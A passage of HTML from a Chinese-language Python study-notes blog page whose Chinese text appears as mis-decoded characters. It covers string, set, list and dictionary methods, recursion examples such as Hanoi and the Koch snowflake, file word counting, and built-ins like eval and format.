builtin">chr</span><span class="token punctuation">(</span><span class="token number">9800</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>â™ˆâ™‰â™Šâ™‹â™Œâ™â™â™â™â™‘â™’â™“</p><h2 id="å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•"><a href="#å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•"></a>å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•</h2><table><thead><tr><th align="center">æ–¹æ³•åŠä½¿ç”¨</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">str.lower()æˆ–str.upper()</td><td align="center">è¿”å›å­—ç¬¦ä¸²çš„å‰¯æœ¬ï¼Œå…¨éƒ¨å­—ç¬¦å°å†™/å¤§å†™ â€œAbCdEfGhâ€.lower()ç»“æœä¸ºâ€œabcdefghâ€</td></tr><tr><td align="center">str.split(sep=None)</td><td align="center">è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œç”±stræ ¹æ®sepè¢«åˆ†éš”çš„éƒ¨åˆ†ç»„æˆ â€œA,B,Câ€.split(â€œ,â€)ç»“æœä¸º[â€˜Aâ€™,â€™Bâ€™,â€™Câ€™]</td></tr><tr><td align="center">str.count(sub)</td><td align="center">è¿”å›å­ä¸²subåœ¨strä¸­å‡ºç°çš„æ¬¡æ•°  â€œa apple a dayâ€.count(â€œaâ€)ç»“æœä¸º4</td></tr><tr><td align="center">str.replace(old,new)</td><td align="center">è¿”å›å­—ç¬¦ä¸²strå‰¯æœ¬ï¼Œæ‰€æœ‰oldå­ä¸²è¢«æ›¿æ¢ä¸ºnew â€œpythonâ€.replace(â€œnâ€,â€n123â€)ç»“æœä¸ºâ€˜python123â€™</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">å­—ç¬¦ä¸²stræ ¹æ®å®½åº¦widthå±…ä¸­fillcharå¯é€‰ â€œpythonâ€.center(20,â€=â€) ç»“æœä¸ºâ€˜=======python=======â€™</td></tr><tr><td align="center">str.strip(chars)</td><td align="center">ä»strä¸­å»æ‰åœ¨å…¶å·¦ä¾§å’Œå³ä¾§charsä¸­åˆ—å‡ºçš„å­—ç¬¦ â€œ= python=â€.strip(â€œ =npâ€)ç»“æœä¸º â€˜ythoâ€™</td></tr><tr><td align="center">str.join(iter)</td><td align="center">åœ¨iterå˜é‡é™¤æœ€åå…ƒç´ å¤–æ¯ä¸ªå…ƒç´ åå¢åŠ ä¸€ä¸ª strâ€,â€.join(â€œ12345â€)ç»“æœä¸ºâ€™1,2,3,4,5â€™ ä¸»è¦ç”¨äºå­—ç¬¦ä¸²åˆ†éš”ç­‰</td></tr><tr><td align="center">str.isdigit()</td><td align="center">åˆ¤æ–­æ¥æ”¶çš„å­—ç¬¦æ˜¯å¦ä¸ºæ•°å­—ï¼Œè¿”å›Trueæˆ–Falseï¼Œæ— å‚æ•°</td></tr></tbody></table><h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><p>å³ç¨‹åºæŠ¥é”™æ‰§è¡Œexceptçš„è¯­å¥</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200204172105285.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200204172853121.png" style="zoom:67%;" loading="lazy"><p>å¼‚å¸¸ç±»å‹è¯¦è§ï¼š<a href="https://www.runoob.com/python/python-exceptions.html">Python å¼‚å¸¸å¤„ç†</a></p><h2 id="éšæœºæ•°å‡½æ•°"><a href="#éšæœºæ•°å‡½æ•°" class="headerlink" title="éšæœºæ•°å‡½æ•°"></a>éšæœºæ•°å‡½æ•°</h2><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">randint(a,b)</td><td align="center">ç”Ÿæˆä¸€ä¸ª[a,b]ä¹‹é—´çš„æ•´æ•°&gt;&gt;&gt;random.randint(10,100)=64</td></tr><tr><td align="center">randrange(m,n[,k])</td><td align="center">ç”Ÿæˆä¸€ä¸ª[m,n)ä¹‹é—´ä»¥kä¸ºæ­¥é•¿çš„éšæœºæ•´æ•°&gt;&gt;&gt;random.randrange(10,100,10)=80</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">ç”Ÿæˆä¸€ä¸ªkæ¯”ç‰¹é•¿çš„éšæœºæ•´æ•°&gt;&gt;&gt;random.getrandbits(16)=37885</td></tr><tr><td align="center">uniform(a,b)</td><td align="center">ç”Ÿæˆä¸€ä¸ª[a,b]ä¹‹é—´çš„éšæœºå°æ•°&gt;&gt;&gt;random.uniform(10,100)=13.234563456</td></tr><tr><td align="center">choice(seq)</td><td align="center">ä»åºåˆ—seqä¸­éšæœºé€‰æ‹©ä¸€ä¸ªå…ƒç´ &gt;&gt;&gt;random.choice([1,2,3,4,5,6,7,8,9,0])=5</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">å°†åºåˆ—seqä¸­å…ƒç´ éšæœºæ’åºï¼Œè¿”å›æ‰“ä¹±åçš„åºåˆ—                             &gt;&gt;&gt;s=[1,2,3,4];random.shuffle(s);print(s)   [3,1,4,2]</td></tr></tbody></table><blockquote><p>globalï¼šåœ¨å‡½æ•°å†…éƒ¨å£°æ˜å…¨å±€å˜é‡</p></blockquote><h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><p>é˜¶ä¹˜ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> a<span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ±‚å’Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> a<span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ±‰è¯ºå¡”é—®é¢˜æ±‚è§£</p><pre class="language-python" data-language="python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">hanoi</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        hanoi<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>src<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>dst<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        hanoi<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>mid<span class="token punctuation">,</span>dst<span class="token punctuation">,</span>src<span class="token punctuation">)</span>hanoi<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span></code></pre><p>ç§‘èµ«æ›²çº¿é›ªèŠ±ç»˜åˆ¶</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle<span class="token keyword">def</span> <span class="token function">koch</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        turtle<span class="token punctuation">.</span>fd<span class="token punctuation">(</span>size<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> angle <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span>angle<span class="token punctuation">)</span>            koch<span class="token punctuation">(</span>size<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        koch<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment">#2é˜¶ç§‘èµ«æ›²çº¿ï¼Œé˜¶æ•°</span>        turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="é›†åˆå¤„ç†æ–¹æ³•"><a href="#é›†åˆå¤„ç†æ–¹æ³•" class="headerlink" title="é›†åˆå¤„ç†æ–¹æ³•"></a>é›†åˆå¤„ç†æ–¹æ³•</h2><table><thead><tr><th align="center">æ“ä½œå‡½æ•°æˆ–æ–¹æ³•</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">å¦‚æœxä¸åœ¨é›†åˆSä¸­ï¼Œå°†xå¢åŠ åˆ°S</td></tr><tr><td align="center">S.discard(x)</td><td align="center">ç§»é™¤Sä¸­å…ƒç´ xï¼Œå¦‚æœä¸åœ¨é›†åˆSä¸­ï¼Œä¸æŠ¥é”™</td></tr><tr><td align="center">S.remove()</td><td align="center">ç§»é™¤Sä¸­å…ƒç´ xï¼Œå¦‚æœxä¸åœ¨é›†åˆSä¸­ï¼Œäº§ç”ŸKeyErrorå¼‚å¸¸</td></tr><tr><td align="center">S.clear()</td><td align="center">ç§»é™¤Sä¸­çš„æ‰€æœ‰å…ƒç´ </td></tr><tr><td align="center">S.pop()</td><td align="center">éšæœº<strong>è¿”å›</strong>Sä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œ<strong>æ›´æ–°</strong>Sï¼Œè‹¥Sä¸ºç©ºäº§ç”ŸKeyErrorå¼‚å¸¸</td></tr><tr><td align="center">S.copy()</td><td align="center">è¿”å›é›†åˆSä¸­çš„ä¸€ä¸ªå‰¯æœ¬</td></tr><tr><td align="center">len(S)</td><td align="center">è¿”å›é›†åˆSçš„å…ƒç´ ä¸ªæ•°</td></tr><tr><td align="center">x in S</td><td align="center">åˆ¤æ–­Sä¸­å…ƒç´ xï¼Œxåœ¨é›†åˆSä¸­ï¼Œè¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td align="center">x not in S</td><td align="center">åˆ¤æ–­Sä¸­å…ƒç´ xï¼Œxä¸åœ¨é›†åˆSä¸­ï¼Œè¿”å›Falseï¼Œå¦åˆ™è¿”å›True</td></tr><tr><td align="center"><code>set(x)</code></td><td align="center">å°†å…¶ä»–ç±»å‹å˜é‡xè½¬å˜ä¸º<code>é›†åˆ</code>ç±»å‹ï¼Œå¯ç”¨ä»¥é›†åˆå…ƒç´ å»é‡</td></tr><tr><td align="center"><code>list(x)</code></td><td align="center">è½¬æ¢ä¸º<code>åˆ—è¡¨</code>ç±»å‹</td></tr><tr><td align="center"><code>tuple(x)</code></td><td align="center">è½¬æ¢ä¸º<code>å…ƒç»„</code>ç±»å‹</td></tr></tbody></table><h2 id="åºåˆ—"><a href="#åºåˆ—" class="headerlink" title="åºåˆ—"></a>åºåˆ—</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205173145060.png" style="zoom:67%;" loading="lazy"><table><thead><tr><th align="center">å‡½æ•°å’Œæ–¹æ³•</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">len(s)</td><td align="center">è¿”å›åºåˆ—sçš„é•¿åº¦</td></tr><tr><td align="center">min(s)</td><td align="center">è¿”å›åºåˆ—sçš„æœ€å°å…ƒç´ ï¼Œsä¸­å…ƒç´ éœ€è¦å¯æ¯”è¾ƒ</td></tr><tr><td align="center">max(s)</td><td align="center">è¿”å›åºåˆ—sçš„æœ€å¤§å…ƒç´ ï¼Œsä¸­å…ƒç´ éœ€è¦å¯æ¯”è¾ƒ</td></tr><tr><td align="center">s.index(x)æˆ–s.index(x,i,j)</td><td align="center">è¿”å›åºåˆ—sä»iå¼€å§‹åˆ°jä½ç½®ä¸­ç¬¬ä¸€æ¬¡å‡ºç°å…ƒç´ xçš„ä½ç½®</td></tr><tr><td align="center">s.count(x)</td><td align="center">è¿”å›åºåˆ—sä¸­å‡ºç°xçš„æ€»æ¬¡æ•°</td></tr></tbody></table><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205175031008.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205175315482.png" style="zoom:67%;" loading="lazy"><blockquote><p>sorted()ï¼šå¯¹åˆ—è¡¨è¿›è¡Œæ’åºï¼ˆå°åˆ°å¤§ï¼‰</p></blockquote><h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><p>ä½¿ç”¨<code>&#123;&#125;</code>å’Œ<code>dict&#123;&#125;</code>ç»™å˜é‡èµ‹å€¼åˆ›å»ºï¼Œé”®å€¼å¯¹ä¹‹é—´ç”¨<code>:</code>åˆ†éš”ï¼Œd[key]å¯ä»¥è¿›è¡Œç´¢å¼•ä¹Ÿå¯ç”¨äºèµ‹å€¼ï¼Œä½†åœ¨è¿›è¡Œèµ‹å€¼çš„æ—¶å€™åªèƒ½å•Š<code>a[1] = a[2]</code>è¿™æ ·èµ‹å€¼ï¼Œä¸èƒ½<code>1 = a[1]</code>ã€a[i]ä»£è¡¨çš„æ˜¯iè¿™ä¸ªé”®å¯¹åº”çš„å€¼ï¼Œæ— æ³•ç›´æ¥ä¿®æ”¹å€¼çš„é”®ï¼Œå¦‚æœè¦å¯¹é”®æ“ä½œéœ€è¦å°†è¿™ä¸ªé”®åˆ é™¤ï¼ˆå³<code>(del a[i])</code>ï¼‰ï¼Œç„¶åå†å°†è¿™ä¸ªå€¼èµ‹ç»™ä¸€ä¸ªæ–°çš„é”®ã€‚</p><p><code>update()</code>æ–¹æ³•ï¼Œåœ¨å­—å…¸ä¸­æ·»åŠ é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥èµ‹å€¼æ·»åŠ </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200216101507795.png" alt loading="lazy"></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205184557293.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205184654602.png" style="zoom:67%;" loading="lazy"><h2 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200207164533879.png" style="zoom:67%;" loading="lazy"><p>æ–‡ä»¶è¯»å–æ–¹æ³•ï¼š<code>read()</code>,<code>readline()</code>,<code>readlines()</code>,åœ¨å…¥æ–¹æ³•ï¼š<code>write()</code>,<code>writelines()</code></p><p>äºŒç»´æ•°æ®çš„å¤„ç†ï¼š<code>for</code>å¾ªç¯+<code>.split()</code>å’Œ<code>.join()</code></p><p>ä¸‰å›½æ¼”ä¹‰äººç‰©å‡ºåœºè¯é¢‘ç»Ÿè®¡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jiebatxt <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ä¸‰å›½æ¼”ä¹‰.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>words <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>txt<span class="token punctuation">)</span>  <span class="token comment">#lcutç²¾ç¡®æ¨¡å¼ï¼Œè¿”å›ä¸€åˆ—è¡¨ç±»å‹</span>counts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        counts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> counts<span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#å­—å…¸ç±»å‹ä¸­'='ä¸ºåˆ›é€ ä¸€ä¸ªé”®å€¼å¯¹ï¼Œäº¦å¯è¿›è¡Œèµ‹å€¼æ“ä½œ</span>items <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#itemsæ–¹æ³•ä¸ºè¿”å›å­—å…¸ä¸­æ‰€æœ‰çš„é”®å€¼å¯¹ä¿¡æ¯</span>items<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span>count <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;10&#125;&#123;1:>5&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h2><p>ç”Ÿæˆå™¨<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856/">å‚è€ƒ</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193657638.png" style="zoom:67%;" loading="lazy"><h2 id="is"><a href="#is" class="headerlink" title="is"></a>is</h2><p>åœ¨Pytohnä¸­ï¼Œè¿›è¡Œæ•°å€¼æ¯”è¾ƒæ—¶ä¼šç”¨åˆ° <code>==</code> è¿ç®—ç¬¦ï¼Œåˆ¤æ–­ä¸¤ä¸ªå˜é‡çš„åœ°å€æ˜¯å¦ç›¸åŒç”¨ <code>is</code> å…³é”®å­—</p><p>å¦‚ä¸‹åˆ—æ¯”è¾ƒæ“ä½œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163737563.png" alt loading="lazy"></p><h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h2><p>Python pass æ˜¯ç©ºè¯­å¥ï¼Œæ˜¯ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚</p><p><strong>pass</strong> ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sample</span><span class="token punctuation">(</span>n_samples<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p>è¯¥å¤„çš„ pass ä¾¿æ˜¯å æ®ä¸€ä¸ªä½ç½®ï¼Œå› ä¸ºå¦‚æœå®šä¹‰ä¸€ä¸ªç©ºå‡½æ•°ç¨‹åºä¼šæŠ¥é”™ï¼Œå½“ä½ æ²¡æœ‰æƒ³å¥½å‡½æ•°çš„å†…å®¹æ˜¯å¯ä»¥ç”¨ pass å¡«å……ï¼Œä½¿ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><h2 id="u-r-b-f"><a href="#u-r-b-f" class="headerlink" title="u,r,b,f"></a>u,r,b,f</h2><p>åœ¨å­—ç¬¦ä¸²å‰é¢ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„è¯†åˆ«å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ï¼Œäºæ˜¯åœ¨å­—ç¬¦ä¸²å‰é¢åŠ ä¸Šè¿™äº›æ ‡è¯†ç¬¦æ¥è¯†åˆ«</p><ul><li>uï¼šåé¢å­—ç¬¦ä¸²ä»¥ Unicode æ ¼å¼ è¿›è¡Œç¼–ç ï¼Œä¸€èˆ¬ç”¨åœ¨ä¸­æ–‡å­—ç¬¦ä¸²å‰é¢ï¼Œé˜²æ­¢å› ä¸ºæºç å‚¨å­˜æ ¼å¼é—®é¢˜ï¼Œå¯¼è‡´å†æ¬¡ä½¿ç”¨æ—¶å‡ºç°ä¹±ç ã€‚</li><li>rï¼šå»æ‰åæ–œæ çš„è½¬ä¹‰æœºåˆ¶ã€‚å¸¸ç”¨äºreæ¨¡å—</li><li>bï¼šåé¢å­—ç¬¦ä¸²æ˜¯bytes ç±»å‹ã€‚åœ¨ç½‘ç»œç¼–ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å’Œæµè§ˆå™¨åªè®¤bytes ç±»å‹æ•°æ®ã€‚</li><li>fï¼šå­—ç¬¦ä¸²å†…æ”¯æŒå¤§æ‹¬å·å†…çš„python è¡¨è¾¾å¼</li></ul><h2 id="å’Œ"><a href="#å’Œ" class="headerlink" title="*å’Œ**"></a><code>*</code>å’Œ<code>**</code></h2><p>è¿™ä¸¤ç§ç”¨æ³•å¯ä»¥å°†<strong>ä»»æ„ä¸ªæ•°</strong>çš„å‚æ•°å¯¼å…¥åˆ°pythonå‡½æ•°ä¸­</p><p>å•æ˜Ÿå·<code>ï¼ˆ*ï¼‰</code>ï¼š<code>*agrs</code> å°†æ‰€æœ‰å‚æ•°ä»¥<strong>å…ƒç»„(tuple)</strong>çš„å½¢å¼å¯¼å…¥ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span><span class="token operator">*</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>a<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>b<span class="token punctuation">(</span><span class="token operator">*</span>k<span class="token punctuation">)</span>   <span class="token comment">#è§£å‹å‚æ•°åˆ—è¡¨</span></code></pre><p>è¾“å‡ºï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token number">2</span></code></pre><p>åŒæ˜Ÿå·<code>ï¼ˆ**ï¼‰</code>ï¼š<code>**kwargs</code> å°†å‚æ•°ä»¥<strong>å­—å…¸</strong>çš„å½¢å¼å¯¼å…¥ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span><span class="token operator">**</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p>è¾“å‡ºï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span></code></pre><h1 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>è¯„ä¼°å‡½æ•°</p><p>ç”¨æ³•ï¼šå»æ‰å‚æ•°æœ€å¤–ä¾§å¼•å·å¹¶æ‰§è¡Œä½™ä¸‹è¯­å¥çš„å‡½æ•°</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200201103455433.png" alt loading="lazy"></p><h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>æ ¼å¼åŒ–å‡½æ•°</p><p>åŸºæœ¬è¯­æ³•æ˜¯é€šè¿‡{}å’Œ:æ¥ä»£æ›¿ä»¥å‰çš„%ï¼Œ<a href="https://www.runoob.com/python/att-string-format.html">è¯¦</a></p><img 